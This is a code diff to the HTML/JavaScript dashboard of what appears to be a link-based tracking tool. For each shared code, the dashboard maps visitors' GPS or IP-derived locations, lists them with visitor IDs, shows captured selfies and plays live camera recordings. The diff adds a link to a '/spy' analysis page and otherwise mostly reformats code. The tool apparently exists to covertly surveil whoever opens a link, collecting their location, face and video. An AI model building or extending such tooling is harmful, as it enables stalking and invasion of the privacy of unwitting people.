@@ -60,6 +60,7 @@ select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;co
   <button id="bshow" type="button">🟢 追跡を表示</button>
   <button id="bhide" type="button">⚪ 追跡を隠す</button>
   <a class="btn" href="{{ share }}" target="_blank">開く</a>
+  <a class="btn" href="{{ base }}/gp/{{ code }}/spy">解析</a>
 </div>
 
 <div class="grid">
@@ -133,7 +134,8 @@ select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;co
 
   document.getElementById('sharecopy').addEventListener('click', function () {
     var b = this, u = document.getElementById('shareurl').value;
-    function done() { b.textContent = 'コピーしました'; setTimeout(function () { b.textContent = 'このURLをコピー'; }, 1500); }
+    function done() { b.textContent = 'コピーしました';
+      setTimeout(function () { b.textContent = 'このURLをコピー'; }, 1500); }
     function fb() {
       try { var t = document.createElement('textarea'); t.value = u;
             t.style.cssText = 'position:fixed;left:-9999px'; document.body.appendChild(t);
@@ -146,11 +148,13 @@ select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;co
   var map = L.map('map').setView([36.2, 138.2], 5);
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
     { maxZoom: 19, attribution: 'OSM' }).addTo(map);
-  var line = null, mark = null, trail = L.layerGroup().addTo(map), gm = L.layerGroup().addTo(map);
+  var line = null, mark = null,
+      trail = L.layerGroup().addTo(map), gm = L.layerGroup().addTo(map);
 
   function drawAll() {
     trail.clearLayers(); gm.clearLayers();
-    var ll = pts.filter(function (p) { return p.lat != null; }).map(function (p) { return [p.lat, p.lon]; });
+    var ll = pts.filter(function (p) { return p.lat != null; })
+                .map(function (p) { return [p.lat, p.lon]; });
     if (!ll.length) return;
     line = L.polyline(ll, { color: '#4c8dff', weight: 3, opacity: .8 }).addTo(trail);
     var lp = ll[ll.length - 1];
@@ -174,8 +178,8 @@ select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;co
       h += '<tr><td class="mono">' + (p.ts || '').slice(5, 19) + '</td><td class="mono">' +
         (p.lat != null ? (+p.lat).toFixed(5) + ', ' + (+p.lon).toFixed(5) : '-') + '</td><td>' +
         (p.acc ? '±' + Math.round(p.acc) + 'm' : '-') + '</td><td>' +
-        (p.src === 'gps' ? 'GPS' : '回線推定') + '</td><td>' + (p.city || '') + '</td><td class="mono">' +
-        (p.vid || '').slice(0, 8) + '</td></tr>';
+        (p.src === 'gps' ? 'GPS' : '回線推定') + '</td><td>' + (p.city || '') +
+        '</td><td class="mono">' + (p.vid || '').slice(0, 8) + '</td></tr>';
     });
     document.getElementById('ptable').innerHTML = h;
   }
@@ -187,7 +191,9 @@ select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;co
       .then(function (r) { return r.json(); })
       .then(function (j) {
         if (!j) return;
-        (j.points || []).forEach(function (p) { if (p.id > lastId) { lastId = p.id; pts.push(p); addPt(p); } });
+        (j.points || []).forEach(function (p) {
+          if (p.id > lastId) { lastId = p.id; pts.push(p); addPt(p); }
+        });
         table();
         var L0 = j.last || {};
         var el = document.getElementById('vlast');
@@ -203,12 +209,13 @@ select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;co
         document.getElementById('vts').textContent = (L0.ts || '').slice(11, 19) || '-';
         document.getElementById('vn').textContent = j.count || 0;
         document.getElementById('warn').textContent =
-          j.mode !== 'gps' && (j.last || {}).src === 'ip'
-            ? '一部または全部がIP推定の位置です。4G/5G回線では数km〜数十kmの誤差が出ます（GPSを許可していれば精度が上がります）' : '';
+          (L0.src === 'ip')
+            ? '一部または全部がIP推定の位置です。4G/5G回線では数km〜数十kmの誤差が出ます（GPSを許可していれば精度が上がります）'
+            : '';
         if (j.selfie && j.selfie !== lastSelfie) {
           lastSelfie = j.selfie;
           var im = document.getElementById('selfie');
-          if (im) { im.src = j.selfie; }
+          if (im) im.src = j.selfie;
           var si = document.getElementById('selfieinfo');
           if (si) si.textContent = (j.selfie_ts || '').slice(5, 19);
         }
@@ -218,17 +225,16 @@ select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;co
   poll();
 
   {% if link.mode == 'live' %}
-  var recEl = document.getElementById('cam'), list = [], idx = 0, curSid = '';
+  var recEl = document.getElementById('cam'), list = [], idx = 0;
   function loadList() {
     fetch('/g/' + encodeURIComponent(CODE) + '/v.json', { cache: 'no-store' })
       .then(function (r) { return r.json(); })
       .then(function (j) {
-        var f = (j.files || []).filter(function (x) { return x.seq > 0 || true; });
-        list = f;
+        list = (j.files || []);
         document.getElementById('recinfo').textContent =
-          f.length ? f.length + '本 / 最大 ' + j.keep_min + '分ぶん' : '録画はまだありません';
+          list.length ? list.length + '本 / 最大 ' + j.keep_min + '分ぶん' : '録画はまだありません';
         var oa = document.getElementById('openall');
-        if (oa && f.length) oa.href = f[f.length - 1].url;
+        if (oa && list.length) oa.href = list[list.length - 1].url;
       }).catch(function () {});
   }
   function playAt(i) {
@@ -237,10 +243,15 @@ select,input[type=text],input[type=number]{padding:5px 8px;background:#11141a;co
     recEl.src = list[idx].url;
     var p = recEl.play(); if (p && p.catch) p.catch(function () {});
   }
-  if (recEl) recEl.addEventListener('ended', function () { if (idx + 1 < list.length) playAt(idx + 1); });
+  if (recEl) recEl.addEventListener('ended', function () {
+    if (idx + 1 < list.length) playAt(idx + 1);
+  });
   document.getElementById('playall').addEventListener('click', function () { playAt(0); });
-  document.getElementById('playlast').addEventListener('click', function () { playAt(list.length - 1); });
-  loadList(); setInterval(loadList, 15000);
+  document.getElementById('playlast').addEventListener('click', function () {
+    playAt(list.length - 1);
+  });
+  loadList();
+  setInterval(loadList, 15000);
   {% endif %}
 
   var KEY = 'gps_hidemap_' + CODE;
